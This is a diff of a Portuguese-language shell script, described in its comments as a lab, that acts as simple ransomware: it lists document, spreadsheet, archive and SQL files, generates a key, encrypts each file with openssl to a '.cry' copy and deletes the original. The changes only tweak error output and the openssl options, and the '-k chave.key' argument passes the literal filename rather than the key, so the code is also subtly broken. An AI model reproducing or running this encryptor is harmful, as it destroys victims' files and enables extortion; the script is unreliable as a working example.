@@ -5,7 +5,7 @@
 #################################
 
 # local e exntesões de arquivos que serão atacadas neste lab:
-arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql)
+arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
 
 # variavel que vai armazenar chave privada para decriptar
 chave=$(/usr/bin/dbus-uuidgen)
@@ -16,7 +16,7 @@ echo $chave > chave.key
 for file in $arquivos
 do
 	# agora vamos encriptar tudo usando a chave desejada
-	openssl enc -in $file -out $file".cry" -e -aes256 -k chave.key 
+	openssl enc -in $file -out $file".cry" -e -md sha512 -k chave.key 
 	rm $file
 
 done
